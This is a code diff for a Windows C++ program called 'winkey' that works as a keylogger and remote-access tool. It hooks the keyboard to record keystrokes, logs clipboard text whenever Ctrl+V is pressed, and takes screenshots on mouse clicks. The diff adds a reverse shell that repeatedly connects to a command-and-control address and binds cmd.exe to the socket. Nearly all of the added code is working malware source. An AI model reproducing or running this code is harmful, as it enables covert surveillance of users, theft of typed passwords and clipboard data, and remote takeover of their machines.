@@ -3,6 +3,8 @@
 #define _WIN32_WINNT 0x0600
 #define _UNICODE 0
 
+#include "winkey.hpp"
+
 #include <windows.h>
 
 #include "KeyboardInputLog.hpp"
@@ -20,7 +22,6 @@
 
 #include <cctype>
 #include <sstream>
-#include "remote.hpp"
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -34,8 +35,6 @@
 #include <gdiplusheaders.h>
 #include <sys/timeb.h>
 
-std::ofstream out;
-
 KBDLLHOOKSTRUCT lastKb;
 bool isDead = false;
 bool lastIsDead = false;
@@ -43,8 +42,8 @@ bool lastIsDead = false;
 BYTE lastKeyState[256];
 
 KeyboardInputLog current_input;
-Logger logger(out);
-std::string dirPath;
+Logger logger;
+std::string dirPath; 
 
 bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal)
 {
@@ -80,8 +79,8 @@ bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal)
     if (!SUCCEEDED(res) || !file) {
         stream->Release();
         picture->Release();
-        return false;
-    }
+        return false; 
+    }     
 
     HGLOBAL mem = 0;
     GetHGlobalFromStream(stream, &mem);
@@ -180,9 +179,9 @@ void TakeScreenshot()
 
     // copy from the desktop device context to the bitmap device context
     // call this once per 'frame'
-    BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY | CAPTUREBLT );
+    BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY | CAPTUREBLT);
 
-    std::string folderpath = (std::stringstream() << dirPath << "\\logs\\screens\\" << std::put_time(&tm, "%F")).str();
+    std::string folderpath = (std::stringstream() << dirPath << "\\logs\\" << std::put_time(&tm, "%F") << "\\screenshots").str();
 
     std::string filepath = (std::stringstream() << folderpath << "\\" << std::put_time(&tm, "%Hh%Mm%Ss") << ms << "ms").str();
 
@@ -206,9 +205,10 @@ void TakeScreenshot()
     // ..and delete the context you created
     DeleteDC(hDest);
 }
-/*
+
 DWORD WINAPI TakeScreenshotAsync_(LPVOID )
 {
+	Sleep(200);
 	TakeScreenshot();
 	return 0;
 }
@@ -216,8 +216,9 @@ DWORD WINAPI TakeScreenshotAsync_(LPVOID )
 void TakeScreenshotAsync()
 {
 	DWORD myThreadID;
-	CreateThread(0, 0, TakeScreenshotAsync_, NULL, 0, &myThreadID);
-}*/
+	auto t = CreateThread(0, 0, TakeScreenshotAsync_, NULL, 0, &myThreadID);
+	CloseHandle(t);
+}
 
 void CleanKernelBuffer(KBDLLHOOKSTRUCT* kb)
 {
@@ -255,6 +256,29 @@ std::string GetKeyNameTextString(KBDLLHOOKSTRUCT* kb)
         return std::string("UNKNOWN");
 }
 
+
+void handleClipboard(std::string prefix)
+{
+    if (OpenClipboard(nullptr)) {
+
+        auto handle = GetClipboardData(CF_UNICODETEXT);
+
+        if (handle != nullptr) {
+            const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));
+
+            if (buffer != nullptr) {
+                std::stringstream ss;
+                ss << '(' << prefix << ") " << '"' << utf8::narrow(buffer) << '"';
+                logger.log(ss.str(), "Clipboard");
+            }
+
+            GlobalUnlock(handle);
+        }
+
+        CloseClipboard();
+    }
+}
+
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0) {
@@ -276,7 +300,10 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             } else if (r > 0 && !(r == 1 && str[0] < 128 && !std::isprint(str[0]))) {
                 logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::TEXT, utf8::narrow(str)));
             } else {
-                logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, GetKeyNameTextString(kb)));
+                if (r == 1 && kb->vkCode == 'V' && (GetKeyState(VK_CONTROL) >> 15))
+                    handleClipboard("PASTE");
+                else
+                    logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, GetKeyNameTextString(kb)));
             }
 
             RestoreDeadKeyInBufferIfNeeded(kb, state);
@@ -340,6 +367,8 @@ void CALLBACK WinEventProc(HWINEVENTHOOK, DWORD event, HWND hwnd,
     }
 }
 
+
+
 WPARAM lbutton;
 WPARAM rbutton;
 //WPARAM mbutton;
@@ -358,7 +387,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
         }*/
         if ((wParam == WM_LBUTTONUP || wParam == WM_LBUTTONDOWN) && wParam != lbutton) {
             if (wParam == WM_LBUTTONUP) {
-                TakeScreenshot();
+                TakeScreenshotAsync();
                 logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "LEFT CLICK"));
             }
             lbutton = wParam;
@@ -367,7 +396,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
                 logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "RIGHT CLICK"));
             }
             lbutton = wParam;
-        }/* else if ((wParam == WM_MBUTTONUP || wParam == WM_MBUTTONDOWN) && wParam != mbutton) {
+        } /* else if ((wParam == WM_MBUTTONUP || wParam == WM_MBUTTONDOWN) && wParam != mbutton) {
             if (wParam == WM_RBUTTONUP) {
                 logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "MIDDLE CLICK"));
             }
@@ -376,6 +405,89 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
     }
 
     return CallNextHookEx(mouse_hook, nCode, wParam, lParam);
+}
+
+#define DEFAULT_BUFLEN 1024
+
+void RunShell(char* C2Server, int C2Port)
+{
+
+    while (true) {
+        Sleep(5000); // Five Second
+
+        SOCKET mySocket;
+        sockaddr_in addr;
+        WSADATA version;
+        WSAStartup(MAKEWORD(2, 2), &version);
+        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+        addr.sin_family = AF_INET;
+
+        addr.sin_addr.s_addr = inet_addr(C2Server);
+        addr.sin_port = htons((u_short)C2Port);
+
+        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+            closesocket(mySocket);
+            WSACleanup();
+            continue;
+        } else {
+            char RecvData[DEFAULT_BUFLEN];
+            memset(RecvData, 0, sizeof(RecvData));
+            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+            if (RecvCode <= 0) {
+                closesocket(mySocket);
+                WSACleanup();
+                continue;
+            } else {
+                auto ss = std::stringstream();
+                ss << "Connected to " << C2Server << ":" << C2Port;
+                std::string s = ss.str();
+                logger.log(s, "Shell");
+                char Process[] = "cmd.exe";
+                STARTUPINFO sinfo;
+                PROCESS_INFORMATION pinfo;
+                memset(&sinfo, 0, sizeof(sinfo));
+                sinfo.cb = sizeof(sinfo);
+                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
+                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+                WaitForSingleObject(pinfo.hProcess, INFINITE);
+
+                memset(RecvData, 0, sizeof(RecvData));
+                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
+                if (RecvCode <= 0) {
+                    closesocket(mySocket);
+                    logger.log("Connection closed.", "Shell");
+                    WSACleanup();
+                }
+
+                CloseHandle(pinfo.hProcess);
+                CloseHandle(pinfo.hThread);
+                /*if (strcmp(RecvData, "exit\n") == 0) {
+                    exit(0);
+                }*/
+            }
+        }
+    }
+}
+
+typedef struct {
+    char* C2Server;
+    int port;
+} T;
+
+DWORD WINAPI RunShellAsync_(LPVOID param)
+{
+    T* params = (T*)param;
+    RunShell(params->C2Server, params->port);
+    return 0;
+}
+
+void RunShellAsync(char* C2Server, int port)
+{
+    DWORD myThreadID;
+    T l = { C2Server, port };
+    auto t = CreateThread(0, 0, RunShellAsync_, &l, 0, &myThreadID);
+    CloseHandle(t);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE,
@@ -397,7 +509,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE,
     std::filesystem::path winkeyPath(szPath);
     dirPath = winkeyPath.parent_path().string();
 
-    out.open(dirPath + "\\logs\\all.log", std::ios_base::app);
+	logger = Logger(dirPath + "\\logs");
 
     // Set windows hook
 
@@ -414,7 +526,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE,
 
     MSG msg;
 
-	RunShellAsync("127.0.0.1", 4242)
+    RunShellAsync("127.0.0.1", 4242);
 
     while (GetMessage(&msg, NULL, 0, 0)) { // run forever until process is stopped
         TranslateMessage(&msg);
@@ -422,8 +534,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE,
     }
 
     logger.log("Ending winkey process", "Status");
-
-    out.close();
 
     Gdiplus::GdiplusShutdown(gdiplusToken);
 
